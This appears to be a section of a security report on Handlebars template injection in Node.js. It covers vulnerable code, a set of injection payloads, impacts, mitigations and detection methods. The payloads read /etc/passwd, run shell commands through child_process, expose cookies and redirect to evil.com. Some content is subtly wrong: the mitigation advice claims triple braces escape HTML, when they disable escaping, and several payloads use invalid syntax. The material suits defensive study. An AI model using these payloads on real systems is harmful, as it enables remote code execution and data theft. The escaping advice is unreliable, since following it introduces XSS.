### 4. Deep Analysis of "Inject Malicious Handlebars Template"

#### 4.1 Vulnerability Definition

Handlebars template injection occurs when an attacker can control the content of a Handlebars template that is subsequently compiled and executed by the application.  This is distinct from simply injecting data *into* a pre-defined, trusted template.  The attacker is injecting the *template itself*, which contains Handlebars expressions that are then evaluated.  This allows the attacker to execute arbitrary JavaScript code within the context of the Handlebars rendering process.

#### 4.2 Preconditions

The primary precondition is that **user-supplied data is used to construct the Handlebars template string itself, rather than just providing data to a fixed template.**  This can happen in several ways:

*   **Direct Template Construction from Input:** The most obvious case is when user input is directly concatenated into a string that is then passed to `Handlebars.compile()`.
    ```javascript
    // VULNERABLE CODE
    let userTemplate = req.body.template; // User-controlled input
    let compiledTemplate = Handlebars.compile(userTemplate);
    let html = compiledTemplate(data);
    res.send(html);
    ```

*   **Indirect Template Selection:**  The application might allow users to select a template from a predefined set, but the selection mechanism is vulnerable.  For example, a user might be able to specify a template file path, and a path traversal vulnerability could allow them to load an arbitrary file.
    ```javascript
    // VULNERABLE CODE (if templatePath is not properly sanitized)
    let templatePath = req.query.templatePath;
    let templateContent = fs.readFileSync(templatePath, 'utf-8');
    let compiledTemplate = Handlebars.compile(templateContent);
    let html = compiledTemplate(data);
    res.send(html);
    ```

*   **Template Inclusion from Untrusted Sources:**  If the application uses features like `Handlebars.registerPartial` with partials loaded from a database or external source, and that source is compromised, an attacker could inject a malicious partial.
    ```javascript
    // VULNERABLE CODE (if partialContent comes from an untrusted source)
    Handlebars.registerPartial('myPartial', partialContent);
    let compiledTemplate = Handlebars.compile('{{> myPartial}}');
    let html = compiledTemplate(data);
    res.send(html);
    ```
* **Dynamic Helper Registration:** If the application allows users to define custom helpers, and the helper code itself is not properly validated, an attacker could inject malicious JavaScript code through the helper.
    ```javascript
    //VULNERABLE CODE (if helperCode comes from an untrusted source)
    Handlebars.registerHelper('myHelper', new Function(helperCode));
    ```

#### 4.3 Exploitation Techniques

Here are some examples of malicious Handlebars code that an attacker might inject:

*   **Server-Side (Node.js) - Read Files:**
    ```handlebars
    {{#with (lookup this 'constructor') as |global|}}
      {{#with (lookup global 'process') as |process|}}
        {{#with (lookup process 'mainModule') as |mainModule|}}
          {{#with (lookup mainModule 'require') as |require|}}
            {{#with (require 'fs') as |fs|}}
              {{fs.readFileSync '/etc/passwd' 'utf-8'}}
            {{/with}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
    ```
    This code leverages Handlebars' ability to access the JavaScript runtime environment.  It navigates through the object hierarchy to access the `fs` module and read the `/etc/passwd` file.

*   **Server-Side (Node.js) - Execute Shell Commands:**
    ```handlebars
    {{#with (lookup this 'constructor') as |global|}}
      {{#with (lookup global 'process') as |process|}}
        {{#with (lookup process 'mainModule') as |mainModule|}}
          {{#with (lookup mainModule 'require') as |require|}}
            {{#with (require 'child_process') as |cp|}}
              {{cp.execSync 'ls -la' 'utf-8'}}
            {{/with}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
    ```
    Similar to the previous example, this code accesses the `child_process` module to execute arbitrary shell commands.

*   **Client-Side - Steal Cookies:**
    ```handlebars
    <script>
    {{#with (lookup this 'constructor') as |global|}}
        {{#with (lookup global 'document') as |document|}}
            alert('Cookies: ' + {{document.cookie}});
        {{/with}}
    {{/with}}
    </script>
    ```
    This code accesses the `document.cookie` property and displays it in an alert box.  A more sophisticated attacker would send this data to a server they control.

*   **Client-Side - Redirect to Malicious Site:**
    ```handlebars
    <script>
    {{#with (lookup this 'constructor') as |global|}}
        {{#with (lookup global 'location') as |location|}}
            {{location.href}} = 'http://evil.com';
        {{/with}}
    {{/with}}
    </script>
    ```
    This code redirects the user's browser to a malicious website.

*   **Client-Side - Deface the Page:**
    ```handlebars
    <script>
    {{#with (lookup this 'constructor') as |global|}}
        {{#with (lookup global 'document') as |document|}}
            {{#with (lookup document 'body') as |body|}}
                {{body.innerHTML}} = '<h1>Hacked!</h1>';
            {{/with}}
        {{/with}}
    {{/with}}
    </script>
    ```
    This code replaces the entire content of the page with "Hacked!".

* **Bypass SafeString:**
    ```handlebars
    {{#with (lookup this 'constructor') as |global|}}
        {{#with (lookup global 'Handlebars') as |handlebars|}}
            {{#with (lookup handlebars 'compile') as |compile|}}
                {{#with (compile '<script>alert(1)</script>') as |evil_template|}}
                    {{{evil_template}}}
                {{/with}}
            {{/with}}
        {{/with}}
    {{/with}}
    ```
    This code bypass SafeString mechanism by compiling another template inside.

#### 4.4 Impact Analysis

The impact of successful Handlebars template injection is severe:

*   **Server-Side:**
    *   **Remote Code Execution (RCE):**  The attacker can execute arbitrary code on the server, potentially leading to complete system compromise.
    *   **Data Breach:**  The attacker can access and exfiltrate sensitive data stored on the server, including databases, configuration files, and user data.
    *   **Denial of Service (DoS):**  The attacker can disrupt the application's functionality or crash the server.
    *   **Lateral Movement:**  The attacker can use the compromised server as a pivot point to attack other systems on the network.

*   **Client-Side:**
    *   **Cross-Site Scripting (XSS):**  The attacker can inject malicious JavaScript code that executes in the context of the user's browser.
    *   **Session Hijacking:**  The attacker can steal user cookies and impersonate the user.
    *   **Data Theft:**  The attacker can access and steal sensitive data entered by the user or stored in the browser (e.g., local storage).
    *   **Phishing:**  The attacker can redirect the user to a fake login page to steal credentials.
    *   **Malware Distribution:**  The attacker can use the compromised application to distribute malware to users.

#### 4.5 Mitigation Strategies

The most crucial mitigation is to **never construct Handlebars templates directly from user input.**  Here are specific strategies:

1.  **Use Precompiled Templates:**  Precompile templates during the build process or application startup, rather than at runtime.  This eliminates the possibility of injecting malicious code into the template compilation process.  Handlebars provides command-line tools and Node.js APIs for precompilation.
    ```javascript
    // Example using Handlebars.precompile (in your build script)
    let templateSource = fs.readFileSync('my-template.hbs', 'utf-8');
    let precompiledTemplate = Handlebars.precompile(templateSource);
    fs.writeFileSync('my-template.js', 'Handlebars.templates = Handlebars.templates || {}; Handlebars.templates["my-template"] = ' + precompiledTemplate + ';');

    // In your application code:
    let template = Handlebars.templates['my-template'];
    let html = template(data);
    ```

2.  **Strict Template Source Control:**  Store templates in a secure location (e.g., a dedicated directory within the application's codebase) and ensure that only authorized processes can modify them.  Do not load templates from user-controlled locations or external sources without rigorous validation.

3.  **Input Validation and Sanitization (for Data, NOT Templates):**  While you should *never* construct templates from user input, you *should* validate and sanitize any data that is passed *to* a precompiled template.  Use a robust HTML escaping library (like `he` or the built-in `Handlebars.escapeExpression`) to prevent XSS vulnerabilities when displaying user-provided data within the template.
    ```handlebars
    <p>User Name: {{{userName}}}</p>  <!-- Use triple braces for HTML escaping -->
    ```
    ```javascript
    // Or, explicitly escape:
    let escapedUserName = Handlebars.escapeExpression(userName);
    ```

4.  **Content Security Policy (CSP):**  Implement a strict CSP to limit the sources from which scripts can be loaded and executed.  This can help mitigate the impact of client-side template injection, even if an attacker manages to inject some code.  A strong CSP can prevent the execution of inline scripts and limit the loading of external scripts.

5.  **Least Privilege:**  Run the application with the minimum necessary privileges.  This limits the damage an attacker can do if they achieve RCE.

6.  **Regular Security Audits and Penetration Testing:**  Conduct regular security audits and penetration tests to identify and address potential vulnerabilities, including template injection.

7.  **Dependency Management:** Keep Handlebars.js and other dependencies up to date to benefit from security patches.

8. **Avoid Dynamic Helper Registration from Untrusted Sources:** If you must allow dynamic helper registration, implement strict validation and sandboxing to prevent malicious code execution. Consider using a dedicated JavaScript sandbox environment.

9. **Use a Secure Context:** If you absolutely must evaluate user-provided code, consider using a secure context like a Web Worker or a sandboxed iframe (for client-side) or a separate process with limited privileges (for server-side). This is a complex approach and should be used with extreme caution.

#### 4.6 Detection Methods

*   **Static Code Analysis:**  Use static analysis tools (e.g., ESLint with security plugins, SonarQube) to automatically scan your codebase for patterns that indicate potential template injection vulnerabilities (e.g., direct concatenation of user input into `Handlebars.compile`).

*   **Dynamic Analysis (Fuzzing):**  Use fuzzing techniques to send a wide range of unexpected inputs to your application and monitor for errors or unexpected behavior that might indicate template injection.

*   **Web Application Firewall (WAF):**  Deploy a WAF that can detect and block common template injection payloads.

*   **Intrusion Detection System (IDS):**  Use an IDS to monitor network traffic and server logs for suspicious activity that might indicate an attempted template injection attack.

*   **Log Monitoring:**  Monitor application logs for errors related to Handlebars template compilation or execution.  Look for unusual error messages or unexpected template names.

*   **Manual Code Review:**  Regularly review code that handles user input and template rendering to ensure that best practices are being followed.
